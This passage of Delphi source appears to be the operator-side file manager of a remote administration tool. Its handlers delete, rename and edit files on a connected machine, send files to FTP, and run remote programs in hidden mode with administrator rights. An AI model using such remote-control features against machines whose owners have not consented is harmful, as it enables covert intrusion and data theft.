    FtpUser + '|' + FtpPass + '|' + FtpDir + '|' + FtpFilename + '|' + IntToStr(FtpPort) + '|');
  AddSentLog('Send file ' + lvSearch.Selected.Caption + ' to FTP');
                     
  JSONConfig := TJSONConfig.Create(FTPSettings, PROGRAMPASSWORD);
  JSONConfig.WriteString('Ftp host', FtpHost);
  JSONConfig.WriteString('Ftp user', FtpUser);
  JSONConfig.WriteString('Ftp pass', FtpPass);
  JSONConfig.WriteString('Ftp directory', FtpDir);
  JSONConfig.WriteInteger('Ftp port', FtpPort);
  JSONConfig.SaveConfig;
  JSONConfig.Free;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormFilesManager.P3Click(Sender: TObject);
var
  i: Integer;
begin
  if MessageBox(Handle, 'Are you sure you want to definitively delete selected file(s)/folder(s)?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) <> IDYES
  then Exit;

  for i := lvFiles.Items.Count - 1 downto 0 do
  begin
    Application.ProcessMessages;
    if lvFiles.Items.Item[i].Selected = True then
    begin
      if lvFiles.Items.Item[i].ImageIndex = 3 then
      begin
        Client.SendDatas(FILESDELETEFOLDER + '|' + ExplorerPath + lvFiles.Items.Item[i].Caption + '|Y');
        AddSentLog('Delete folder ' + ExplorerPath + lvFiles.Items.Item[i].Caption + ' definitively');
      end
      else
      begin
        Client.SendDatas(FILESDELETEFILE + '|' + ExplorerPath + lvFiles.Items.Item[i].Caption + '|Y');
        AddSentLog('Delete file ' + ExplorerPath + lvFiles.Items.Item[i].Caption + ' definitively');
      end;
    end;
  end;
end;

procedure TFormFilesManager.T1Click(Sender: TObject);
var
  TmpStr: string;
  i: Integer;
begin
  if MessageBox(Handle, 'Are you sure you want to delete selected file(s)/folder(s)?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) <> IDYES
  then Exit;

  for i := lvFiles.Items.Count - 1 downto 0 do
  begin
    Application.ProcessMessages;
    if lvFiles.Items.Item[i].Selected = True then
    begin
      if lvFiles.Items.Item[i].ImageIndex = 3 then
      begin
        Client.SendDatas(FILESDELETEFOLDER + '|' + ExplorerPath + lvFiles.Items.Item[i].Caption + '|N');
        AddSentLog('Move folder ' + ExplorerPath + lvFiles.Items.Item[i].Caption + ' to recycle bin');
      end
      else
      begin
        Client.SendDatas(FILESDELETEFILE + '|' + ExplorerPath + lvFiles.Items.Item[i].Caption + '|N');
        AddSentLog('Move file ' + ExplorerPath + lvFiles.Items.Item[i].Caption + ' to recycle bin');
      end;
    end;
  end;
end;

procedure TFormFilesManager.H4Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Execute with parameters', 'Enter parameters', TmpStr) then Exit;
  Client.SendDatas(FILESEXECUTEHIDEN + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + TmpStr + '|N');
  AddSentLog('Execute file ' + ExplorerPath + lvFiles.Selected.Caption + ' in hidden mode with parameters ' + TmpStr);
end;

procedure TFormFilesManager.V5Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Execute with parameters', 'Enter parameters', TmpStr) then Exit;
  Client.SendDatas(FILESEXECUTEVISIBLE + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + TmpStr + '|N');   
  AddSentLog('Execute file ' + ExplorerPath + lvFiles.Selected.Caption + ' in visible mode with parameters ' + TmpStr);
end;

procedure TFormFilesManager.H3Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Execute with parameters', 'Enter parameters', TmpStr) then Exit;
  Client.SendDatas(FILESEXECUTEHIDEN + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + TmpStr + '|Y'); 
  AddSentLog('Execute file ' + ExplorerPath + lvFiles.Selected.Caption + ' in hidden mode with parameters ' + TmpStr + ' in administrator mode');
end;

procedure TFormFilesManager.V4Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Execute with parameters', 'Enter parameters', TmpStr) then Exit;
  Client.SendDatas(FILESEXECUTEVISIBLE + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + TmpStr + '|Y');
  AddSentLog('Execute file ' + ExplorerPath + lvFiles.Selected.Caption + ' in hidden mode with parameters ' + TmpStr + ' in administrator mode');
end;

procedure TFormFilesManager.H5Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Execute with parameters', 'Enter parameters', TmpStr) then Exit;
  Client.SendDatas(FILESEXECUTEHIDEN + '|' + lvSearch.Selected.Caption + '|' + TmpStr + '|N');
  AddSentLog('Execute file ' + lvSearch.Selected.Caption + ' in hidden mode with parameters ' + TmpStr);
end;

procedure TFormFilesManager.V6Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Execute with parameters', 'Enter parameters', TmpStr) then Exit;
  Client.SendDatas(FILESEXECUTEVISIBLE + '|' + lvSearch.Selected.Caption + '|' + TmpStr + '|N'); 
  AddSentLog('Execute file ' + lvSearch.Selected.Caption + ' in visible mode with parameters ' + TmpStr);
end;

procedure TFormFilesManager.H6Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Execute with parameters', 'Enter parameters', TmpStr) then Exit;
  Client.SendDatas(FILESEXECUTEHIDEN + '|' + lvSearch.Selected.Caption + '|' + TmpStr + '|Y'); 
  AddSentLog('Execute file ' + lvSearch.Selected.Caption + ' in hidden mode with parameters ' + TmpStr + ' in administrator mode');
end;

procedure TFormFilesManager.V7Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Execute with parameters', 'Enter parameters', TmpStr) then Exit;
  Client.SendDatas(FILESEXECUTEVISIBLE + '|' + lvSearch.Selected.Caption + '|' + TmpStr + '|Y'); 
  AddSentLog('Execute file ' + lvSearch.Selected.Caption + ' in visible mode with parameters ' + TmpStr + ' in administrator mode');
end;

procedure TFormFilesManager.tv1Change(Sender: TObject; Node: TTreeNode);
begin
  LastNode := tv1.Selected;
  ExplorerPath := GetNodeRoot(LastNode);
end;

procedure TFormFilesManager.lvFilesKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if not Assigned(lvFiles.Selected) then Exit;
  if Key = VK_DELETE then P3Click(P3) else
  if Key = VK_RETURN then O1Click(O1) else
  if Key = VK_CLEAR then P1Click(P1);
end;

procedure TFormFilesManager.M3Click(Sender: TObject);
var
  i: Integer;
begin
  if MessageBox(Handle, 'Are you sure you want to delete selected file(s)?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) <> IDYES
  then Exit;

  for i := lvSearch.Items.Count - 1 downto 0 do
  begin
    Application.ProcessMessages;
    if not lvSearch.Items.Item[i].Selected then Continue;
    Client.SendDatas(FILESSEARCHDELETEFILE + '|' + lvSearch.Items.Item[i].Caption + '|N');
    AddSentLog('Move file ' + lvSearch.Items.Item[i].Caption + ' to recycle bin');
  end;
end;

procedure TFormFilesManager.D4Click(Sender: TObject);
var
  i: Integer;
begin
  if MessageBox(Handle, 'Are you sure you want to delete selected file(s)?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) <> IDYES
  then Exit;

  for i := lvSearch.Items.Count - 1 downto 0 do
  begin
    Application.ProcessMessages;
    if not lvSearch.Items.Item[i].Selected then Continue;
    Client.SendDatas(FILESSEARCHDELETEFILE + '|' + lvSearch.Items.Item[i].Caption + '|Y');
    AddSentLog('Delete file ' + lvSearch.Items.Item[i].Caption + ' definitively');
  end;
end;

procedure TFormFilesManager.R6Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  if not InputQuery('Rename file/folder', 'New name', TmpStr) then Exit;
  TmpStr1 := ExtractFilePath(lvSearch.Selected.Caption);
  Client.SendDatas(FILESSEARCHRENAMEFILE + '|' + lvSearch.Selected.Caption + '|' + TmpStr1 + TmpStr);
  AddSentLog('Rename file ' + lvSearch.Selected.Caption + ' by ' + TmpStr1 + TmpStr);
end;

procedure TFormFilesManager.E8Click(Sender: TObject);
var
  TmpStr: string;
  i: Integer;
begin
  for i := 0 to lvSearch.Items.Count - 1 do
  begin
    Application.ProcessMessages;
    if not lvSearch.Items.Item[i].Selected then Continue;
    TmpStr := ExtractFileExt(lvSearch.Items.Item[i].Caption);
    if (not IsImageFile(TmpStr)) and (not IsExeFile(TmpStr)) then
    begin
      Client.SendDatas(FILESEDITFILE + '|' + lvSearch.Items.Item[i].Caption);
      AddSentLog('Edit file ' + lvSearch.Items.Item[i].Caption);
    end;
  end;
end;

procedure TFormFilesManager.btn3Click(Sender: TObject);
begin
  if BackwardPath = '' then Exit;
  ForwardPath := ExplorerPath;
  ExplorerPath := BackwardPath;
  BackwardPath := '';                          
  tv1.Enabled := False;
  Client.SendDatas(FILESLISTFOLDERS + '|' + ExplorerPath);
  AddSentLog('Set directory to ' + ExplorerPath);
end;

procedure TFormFilesManager.btn4Click(Sender: TObject);
begin
  if ForwardPath = '' then Exit;
  BackwardPath := ExplorerPath;
  ExplorerPath := ForwardPath;
  ForwardPath := '';                            
  tv1.Enabled := False;
  Client.SendDatas(FILESLISTFOLDERS + '|' + ExplorerPath);
  AddSentLog('Set directory to ' + ExplorerPath);
end;

procedure TFormFilesManager.btn5Click(Sender: TObject);
var
  TmpStr: string;
begin
  if ExplorerPath = '' then Exit;
  if Length(ExplorerPath) = 3 then
  begin
    R2.Click;
    Exit;
  end;
             
  ForwardPath := ExplorerPath;
  BackwardPath := '';
  
  TmpStr := ForwardPath;
  TmpStr := Copy(TmpStr, 1, Length(TmpStr) - 1);
  TmpStr := Copy(TmpStr, 1, LastDelimiter('\', TmpStr));
  ExplorerPath := TmpStr;
                                                 
  tv1.Enabled := False;
  Client.SendDatas(FILESLISTFOLDERS + '|' + ExplorerPath);
  AddSentLog('Set directory to ' + ExplorerPath);
end;

procedure TFormFilesManager.S2Click(Sender: TObject);
var
  TmpForm: TFormAttributes;
  TmpStr, TmpStr1: string;
begin
  if not Assigned(lvFiles.Selected) then Exit;
  TmpStr := lvFiles.Selected.SubItems[2];

  TmpForm := TFormAttributes.Create(Self);  
  if Pos('A', TmpStr) > 0 then TmpForm.rb1.Checked := True else
  if Pos('D', TmpStr) > 0 then TmpForm.rb2.Checked := True;
  TmpForm.chk1.Checked := Pos('H', TmpStr) > 0;
  TmpForm.chk2.Checked := Pos('R', TmpStr) > 0;
  TmpForm.chk2.Checked := Pos('S', TmpStr) > 0;

  if TmpForm.ShowModal <> IDOK then
  begin
    TmpForm.Release;
    TmpForm := nil;   
    Exit;
  end;

  if TmpForm.rb1.Checked then TmpStr1 := TmpStr1 + 'A' else
  if TmpForm.rb2.Checked then TmpStr1 := TmpStr1 + 'D';
  if TmpForm.chk1.Checked then TmpStr1 := TmpStr1 + 'H';
  if TmpForm.chk2.Checked then TmpStr1 := TmpStr1 + 'R';
  if TmpForm.chk3.Checked then TmpStr1 := TmpStr1 + 'S';
  
  Client.SendDatas(FILESSETATTRIBUTES + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + TmpStr1);
  AddSentLog('Set file TmpStr1 of ' + ExplorerPath + lvFiles.Selected.Caption + ' to ' + TmpStr1);

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormFilesManager.btn7Click(Sender: TObject);
begin
  pnlTransfers.BringToFront;
end;

procedure TFormFilesManager.lvTransfersColumnResize(
  sender: TCustomListView; columnIndex, columnWidth: Integer);
var
  lv : TListViewEx;
  idx : integer;
  pb : TProgressBar;
begin
  lv := lvTransfers;
  //first column
  if columnIndex = 0 then
  begin
    for idx := 0 to -1 + lv.Items.Count do
    begin
      // o objeto zero foi porque eu salvei o progressbar na unittransfer como zero
      pb := TProgressBar(lv.Items[idx].SubItems.Objects[0]);
      pb.Left := columnWidth;
    end;
  end;

  //progress bar column
  if columnIndex = 1 then
  begin
    for idx := 0 to -1 + lv.Items.Count do
    begin
      pb := TProgressBar(lv.Items[idx].SubItems.Objects[0]);
      pb.Width := columnWidth;
    end;
  end;
end;

procedure TFormFilesManager.MenuItem1Click(Sender: TObject);
var
  TransferManager: TTransferManager;
begin
  if not Assigned(lvTransfers.Selected) then Exit;
  TransferManager := TTransferManager(lvTransfers.Selected.Data);
  if TransferManager = nil then Exit;
  TransferManager.ClientSocket.Disconnect;
  
  case TransferManager.TransferType of
    ttDownload: DeleteFile(TransferManager.LocalFilename);
  end;
end;

procedure TFormFilesManager.MenuItem3Click(Sender: TObject);
var
  TransferManager: TTransferManager;
  i, j: Integer;
begin
  for i := lvTransfers.Items.Count - 1 downto 0 do
  begin
    TransferManager := TTransferManager(lvTransfers.Items.Item[i].Data);
    
    if (TransferManager.TransferState = 'Downloading...') or
      (TransferManager.TransferState = 'Uploading...')
    then Continue;

    TransferManager.pb1.Free;
    lvTransfers.Items[i].Delete;
    for j := lvTransfers.Items.Count - 1 downto i do
    begin
      if lvTransfers.Items.Item[j].Data <> nil then
      begin
        TransferManager := TTransferManager(lvTransfers.Items.Item[j].Data);
        TransferManager.pb1.Top := TransferManager.pb1.Top -
          (TransferManager.pb1.BoundsRect.Bottom - TransferManager.pb1.BoundsRect.Top);
      end;
    end;
  end;
end;

procedure TFormFilesManager.MenuItem4Click(Sender: TObject);
begin
  MyShellExecute(Handle, GetDownloadsFolder(Client.UserId), '', SW_SHOWNORMAL);
end;

function SortByColumn(Item1, Item2: TListItem; Data: Integer): Integer; stdcall;
var
  i1, i2: Int64;
  d1, d2: TDateTime;
begin
  if (LastColumn.Index = 2) or (LastColumn.Index = 4) or
    (LastColumn.Index = 5)
  then
  begin
    if LastColumn.Index = 2 then
    begin
      i1 := FileSizeToBytes(Item1.SubItems[1]);
      i2 := FileSizeToBytes(Item2.SubItems[1]);
      if (i1 = i2) then Result := 0 else
      if (i1 > i2) then Result := 1 else Result := -1;
    end
    else
    begin
      if LastColumn.Index = 4 then
      begin
        try d1 := StrToDateTime(Item1.SubItems[3]); except end;
        try d2 := StrToDateTime(Item2.SubItems[3]); except end;
      end
      else
      begin
        try d1 := StrToDateTime(Item1.SubItems[4]); except end;
        try d2 := StrToDateTime(Item1.SubItems[4]); except end;
      end;

      Result := CompareDateTime(d1, d2);
    end;
  end
  else
  begin
    if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption) else
      Result := AnsiCompareText(Item1.SubItems[Data - 1], Item2.SubItems[Data - 1]);
  end;

  if not Ascending then Result := -Result;
end;

function SortByColumn1(Item1, Item2: TListItem; Data: Integer): Integer; stdcall;
var
  i1, i2: Int64;
begin
  if LastColumn.Index = 0 then
  begin
    if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption) else
      Result := AnsiCompareText(Item1.SubItems[Data - 1], Item2.SubItems[Data - 1]);
  end
  else
  begin
    i1 := FileSizeToBytes(Item1.SubItems[1]);
    i2 := FileSizeToBytes(Item2.SubItems[1]);
    if (i1 = i2) then Result := 0 else
    if (i1 > i2) then Result := 1 else Result := -1;
  end;

  if not Ascending then Result := -Result;
end;

procedure TFormFilesManager.lvFilesColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: Integer;
begin
  Ascending := not Ascending;
  if Column <> LastColumn then Ascending := not Ascending;
  LastColumn := Column;

  if TListView(Sender) = lvFiles then lvFiles.CustomSort(@SortByColumn, LastColumn.Index) else
  if TListView(Sender) = lvSearch then lvSearch.CustomSort(@SortByColumn1, LastColumn.Index);
end;

procedure TFormFilesManager.A1Click(Sender: TObject);
var
  BkNode, TmpNode: TTreeNode;
  i: Integer;
begin
  if ExplorerPath = '' then Exit;
  BkNode := nil;

  for i := 0 to tv1.Items.Count - 1 do
  if tv1.Items[i].Text = Bookmarks then
  begin
    BkNode := tv1.Items[i];
    Break;
  end;

  if BkNode = nil then Exit;

  TmpNode := tv1.Items.AddChild(BkNode, ExplorerPath);
  TmpNode.SelectedIndex := 3;
  TmpNode.ImageIndex := 3;

  AddLog('Path ' + ExplorerPath + ' added to bookmarks');
end;

procedure TFormFilesManager.R8Click(Sender: TObject);
var
  BkNode, TmpNode: TTreeNode;
  i: Integer;
begin
  if ExplorerPath = '' then Exit;
  if Pos(Bookmarks, ExplorerPath) <= 0 then Exit;
  if Copy(ExplorerPath, 1, Pos('\', ExplorerPath) - 1) = Bookmarks then Exit;
  tv1.Selected.Delete;
  AddLog('Path ' + ExplorerPath + ' removed from bookmarks');
end;

procedure TFormFilesManager.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  JSONConfig: TJSONConfig;
  TmpStr: string;
  BkNode: TTreeNode;
  i: Integer;
begin
  BkNode := nil;
  BookmarksPath := '';

  for i := 0 to tv1.Items.Count - 1 do
  if tv1.Items[i].Text = Bookmarks then
  begin
    BkNode := tv1.Items[i];
    Break;
  end;

  if (BkNode <> nil) and (BkNode.Count > 0) then
  for i := 0 to BkNode.Count - 1 do
  BookmarksPath := BookmarksPath + BkNode.Item[i].Text + '|';
  
  TmpStr := GetSettingsFolder(Client.UserId) + '\Bookmarks.settings';
  JSONConfig := TJSONConfig.Create(TmpStr, PROGRAMPASSWORD);
  JSONConfig.WriteString('Bookmarks', BookmarksPath);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

end.


